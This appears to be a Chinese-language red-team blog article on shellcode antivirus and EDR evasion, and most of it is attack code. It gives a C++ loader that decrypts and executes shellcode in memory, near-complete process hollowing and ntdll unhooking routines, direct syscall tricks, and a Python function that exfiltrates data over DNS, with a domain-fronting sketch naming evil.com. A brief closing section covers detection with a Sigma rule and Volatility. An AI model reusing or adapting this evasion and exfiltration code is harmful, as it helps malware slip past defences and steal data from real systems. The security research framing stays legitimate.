---
title: "红队免杀技术概述：Shellcode 加载与检测规避"
date: 2026-05-11T06:00:00+08:00
draft: false
categories: ["红队技术"]
tags: ["免杀", "Shellcode", "红队", "EDR绕过", "内存加载"]
description: "系统梳理红队常用的 Shellcode 免杀技术，包括分离加载、加密编码、内存加载、Syscall 直接调用等方法。"
showToc: true
difficulty: advanced
readingTime: 18 min
TocOpen: true
---

## 概述

免杀（Evasion）是红队技术的核心之一。本文系统梳理 Shellcode 加载和检测规避的常用技术，帮助安全从业者理解攻击手法，从而更好地进行防御。

**免责声明：** 本文仅用于授权红队评估和安全研究。未经授权使用这些技术攻击他人系统是违法行为。

## 基础概念

### Shellcode 加载流程

```
传统流程：
文件落地 → 磁盘存储 → 加载执行 → EDR 检测

免杀流程：
分离加载 → 内存解密 → 直接执行 → 绕过检测
```

### 检测点

EDR/AV 的检测主要集中在：
1. **静态检测** — 文件特征、字符串、签名
2. **动态检测** — 行为监控、API 调用链
3. **内存检测** — 内存扫描、特征匹配
4. **网络检测** — C2 通信特征

## 技术 1：分离加载

### 原理

将 Shellcode 与 Loader 分离，避免静态特征被检测。

```
传统：shellcode.exe（包含 Shellcode）
分离：loader.exe + shellcode.bin（分开传输）
```

### 实现

```python
# 生成加密的 Shellcode 文件
import sys
from Crypto.Cipher import AES

def encrypt_shellcode(shellcode, key):
    cipher = AES.new(key, AES.MODE_CBC)
    # Padding
    pad_len = 16 - (len(shellcode) % 16)
    shellcode += bytes([pad_len] * pad_len)
    return cipher.encrypt(shellcode)

# 加载器
def load_and_decrypt(encrypted_file, key):
    with open(encrypted_file, 'rb') as f:
        encrypted = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC)
    decrypted = cipher.decrypt(encrypted)
    
    # 移除 padding
    pad_len = decrypted[-1]
    decrypted = decrypted[:-pad_len]
    
    return decrypted
```

### Loader (C++)

```cpp
#include <windows.h>
#include <fstream>

int main() {
    // 1. 读取加密的 Shellcode
    std::ifstream file("shellcode.bin", std::ios::binary);
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
    
    // 2. 解密（AES key 可以从 C2 获取或硬编码）
    // ... 解密逻辑 ...
    
    // 3. 分配内存并执行
    void* exec = VirtualAlloc(0, buffer.size(), MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, buffer.data(), buffer.size());
    
    // 4. 修改内存权限
    DWORD oldProtect;
    VirtualProtect(exec, buffer.size(), PAGE_EXECUTE_READ, &oldProtect);
    
    // 5. 执行
    ((void(*)())exec)();
    
    return 0;
}
```

## 技术 2：加密/编码

### 常用加密方法

```python
# XOR 加密
def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for b, i in zip(data, range(len(data)))])

# AES 加密
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

def aes_encrypt(data, key):
    cipher = AES.new(key, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ct_bytes

# 自定义编码
def custom_encode(data):
    # Base64 + 自定义字符集
    import base64
    encoded = base64.b64encode(data).decode()
    # 替换字符
    table = str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/',
                          'QRSTUVWXYZABCDEFGHIJKLMNOPabcdefghijklmnopqrstuvwxzy0123456789+/')
    return encoded.translate(table)
```

### 动态解密

```cpp
// 运行时解密，避免内存中出现明文 Shellcode
void dynamic_decrypt(unsigned char* encrypted, size_t len, unsigned char* key) {
    for (size_t i = 0; i < len; i++) {
        encrypted[i] ^= key[i % 16];
    }
}

// 使用时解密
unsigned char encrypted[] = {0x41, 0x42, ...};
unsigned char key[] = {0x12, 0x34, ...};
dynamic_decrypt(encrypted, sizeof(encrypted), key);

// 执行后立即擦除
memset(encrypted, 0, sizeof(encrypted));
```

## 技术 3：内存加载

### 反射式 DLL 注入

```cpp
// 反射式加载 DLL，不经过文件系统
typedef DWORD (WINAPI *REFLECTIVELOADER)(LPVOID lpParam);

HMODULE reflective_load(BYTE* dll_buffer) {
    // 1. 解析 PE 头
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dll_buffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(dll_buffer + dos->e_lfanew);
    
    // 2. 分配内存
    LPVOID base = VirtualAlloc(
        (LPVOID)nt->OptionalHeader.ImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    // 3. 复制 sections
    // 4. 修复 relocations
    // 5. 修复 imports
    // 6. 修改内存权限
    // 7. 调用 DllMain
    
    return (HMODULE)base;
}
```

### Process Hollowing

```cpp
// 创建挂起的合法进程，替换其内存
void process_hollow(const char* target_exe, BYTE* payload) {
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    
    // 1. 创建挂起进程
    CreateProcessA(target_exe, NULL, NULL, NULL, FALSE, 
                   CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    
    // 2. 获取进程上下文
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);
    
    // 3. 读取 PEB 获取 ImageBase
    LPVOID image_base;
    ReadProcessMemory(pi.hProcess, 
                      (LPVOID)(ctx.Rdx + 0x10), 
                      &image_base, sizeof(LPVOID), NULL);
    
    // 4. 卸载原始映像
    NtUnmapViewOfSection(pi.hProcess, image_base);
    
    // 5. 分配新内存并写入 payload
    LPVOID new_base = VirtualAllocEx(pi.hProcess, image_base, 
                                      payload_size, MEM_COMMIT | MEM_RESERVE, 
                                      PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, new_base, payload, payload_size, NULL);
    
    // 6. 修复 PEB 中的 ImageBase
    WriteProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), 
                       &new_base, sizeof(LPVOID), NULL);
    
    // 7. 恢复执行
    ResumeThread(pi.hThread);
}
```

## 技术 4：Syscall 直接调用

### 原理

绕过用户态 API Hook，直接调用系统调用。

```cpp
// 传统方式（被 Hook）
VirtualAlloc(...);  // EDR 可以 Hook 这个 API

// Syscall 方式（绕过 Hook）
__asm {
    mov r10, rcx
    mov eax, 0x18  // NtAllocateVirtualMemory 的 syscall number
    syscall
}
```

### Syscall 封装

```cpp
// 使用 SysWhispers 生成
#include "syscalls.h"

NTSTATUS allocate_memory(HANDLE process, LPVOID* base, SIZE_T size) {
    return NtAllocateVirtualMemory(
        process,
        base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
}
```

### 直接 syscall（动态）

```cpp
// 动态获取 syscall number
DWORD get_syscall_number(const char* function_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    BYTE* func = (BYTE*)GetProcAddress(ntdll, function_name);
    
    // 解析 syscall number
    // mov eax, <number> 的机器码是 B8 xx xx xx xx
    if (func[0] == 0xB8) {
        return *(DWORD*)(func + 1);
    }
    return 0;
}
```

## 技术 5：Unhooking

### 修复被 Hook 的 ntdll

```cpp
// 从磁盘重新加载干净的 ntdll
void unhook_ntdll() {
    // 1. 读取干净的 ntdll
    HANDLE file = CreateFileA("C:\\Windows\\System32\\ntdll.dll", 
                              GENERIC_READ, FILE_SHARE_READ, NULL, 
                              OPEN_EXISTING, 0, NULL);
    
    // 2. 映射到内存
    HANDLE mapping = CreateFileMapping(file, NULL, PAGE_READONLY, 0, 0, NULL);
    LPVOID clean_ntdll = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
    
    // 3. 获取当前 ntdll 基址
    HMODULE hooked_ntdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hooked_ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hooked_ntdll + dos->e_lfanew);
    
    // 4. 修复 .text section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(section->Name, ".text", 5) == 0) {
            // 用干净的数据覆盖被 Hook 的部分
            DWORD old_protect;
            VirtualProtect((BYTE*)hooked_ntdll + section->VirtualAddress,
                          section->Misc.VirtualSize,
                          PAGE_EXECUTE_READWRITE,
                          &old_protect);
            
            memcpy((BYTE*)hooked_ntdll + section->VirtualAddress,
                   (BYTE*)clean_ntdll + section->VirtualAddress,
                   section->Misc.VirtualSize);
            
            VirtualProtect((BYTE*)hooked_ntdll + section->VirtualAddress,
                          section->Misc.VirtualSize,
                          old_protect,
                          &old_protect);
            break;
        }
        section++;
    }
    
    // 5. 清理
    UnmapViewOfFile(clean_ntdll);
    CloseHandle(mapping);
    CloseHandle(file);
}
```

## 技术 6：C2 通信规避

### 域前置 (Domain Fronting)

```
客户端 → CDN (Host: evil.com) → CDN 内部路由 → 合法域名 (google.com)
                                         ↓
                                    实际指向攻击者服务器
```

### DNS 隧道

```python
# 使用 DNS 查询传输数据
import dns.resolver

def exfiltrate_via_dns(data, domain):
    # 编码数据为子域名
    encoded = base64.b32encode(data).decode().lower()
    chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
    
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass
```

### 流量混淆

```python
# 将 C2 流量伪装成正常 HTTPS
import requests

def c2_request(url, data):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    }
    
    # 将数据编码到正常的 HTTP 参数中
    encoded_data = base64.b64encode(data).decode()
    params = {'q': encoded_data, 'page': '1'}
    
    return requests.get(url, headers=headers, params=params)
```

## 检测与防御

### 行为检测

```yaml
# Sigma 规则 - 可疑内存分配
title: Suspicious Memory Allocation
status: stable
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        EventID: 1
        CommandLine|contains:
            - 'VirtualAlloc'
            - 'NtAllocateVirtualMemory'
            - 'PAGE_EXECUTE_READWRITE'
    condition: selection
level: medium
```

### 内存扫描

```bash
# 使用 Volatility 扫描内存中的 Shellcode
volatility -f memory.dmp windows.malfind

# 检查进程内存权限
volatility -f memory.dmp windows.vadinfo
```

### EDR 增强

1. **内核级监控** — 不依赖用户态 Hook
2. **ETW 事件** — 监控系统调用
3. **内存扫描** — 定期扫描进程内存
4. **行为分析** — 检测异常行为模式

## 总结

免杀技术在不断演进，防御也需要持续更新：

1. **分离加载** — 文件与代码分离，绕过静态检测
2. **加密编码** — 运行时解密，避免明文特征
3. **内存加载** — 不经过文件系统，减少检测点
4. **Syscall 直接调用** — 绕过用户态 Hook
5. **Unhooking** — 修复被监控的 API

防御方需要：
- 部署 EDR/AV，但不要过度依赖
- 内核级监控，不只看用户态
- 行为分析，不只看签名
- 纵深防御，多层检测

---

*本文仅用于授权红队评估和安全研究。未经授权使用这些技术攻击他人系统是违法行为。*
